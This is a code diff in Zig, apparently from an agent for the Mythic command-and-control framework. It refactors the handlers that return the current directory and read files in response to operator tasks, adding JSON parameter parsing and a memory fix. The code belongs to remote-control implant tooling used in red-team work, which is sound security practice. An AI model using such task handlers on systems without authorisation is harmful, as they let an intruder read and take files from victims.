@@ -92,7 +92,7 @@ pub const CommandExecutor = struct {
     }
 
     fn executePwd(self: *CommandExecutor, task: MythicTask) !MythicResponse {
-        const cwd = std.process.currentPathAlloc(self.io, self.allocator) catch |err| {
+        const cwd_z = std.process.currentPathAlloc(self.io, self.allocator) catch |err| {
             return MythicResponse{
                 .task_id = task.id,
                 .user_output = try std.fmt.allocPrint(self.allocator, "{}", .{err}),
@@ -100,7 +100,8 @@ pub const CommandExecutor = struct {
                 .status = "error",
             };
         };
-
+        defer self.allocator.free(cwd_z);
+        const cwd = try self.allocator.dupe(u8, cwd_z[0..cwd_z.len]);
         return MythicResponse{
             .task_id = task.id,
             .user_output = cwd,
@@ -147,7 +148,21 @@ pub const CommandExecutor = struct {
     }
 
     fn executeCat(self: *CommandExecutor, task: MythicTask) !MythicResponse {
-        if (task.parameters.len == 0) {
+        const Parameters = struct {
+            path: []const u8,
+        };
+        const parsed = json.parseFromSlice(Parameters, self.allocator, task.parameters, .{}) catch |err| {
+            return MythicResponse{
+                .task_id = task.id,
+                .user_output = try std.fmt.allocPrint(self.allocator, "Failed to parse parameters: {}", .{err}),
+                .completed = true,
+                .status = "error",
+            };
+        };
+        defer parsed.deinit();
+        const path = parsed.value.path;
+
+        if (path.len == 0) {
             return MythicResponse{
                 .task_id = task.id,
                 .user_output = "No filename provided",
@@ -156,10 +171,10 @@ pub const CommandExecutor = struct {
             };
         }
 
-        const content = std.Io.Dir.cwd().readFileAlloc(self.io, task.parameters, self.allocator, .limited(1024 * 1024)) catch |err| {
+        const content = std.Io.Dir.cwd().readFileAlloc(self.io, path, self.allocator, .limited(1024 * 1024)) catch |err| {
             return MythicResponse{
                 .task_id = task.id,
-                .user_output = try std.fmt.allocPrint(self.allocator, "{s}: {}", .{ task.parameters, err }),
+                .user_output = try std.fmt.allocPrint(self.allocator, "{s}: {}", .{ path, err }),
                 .completed = true,
                 .status = "error",
             };
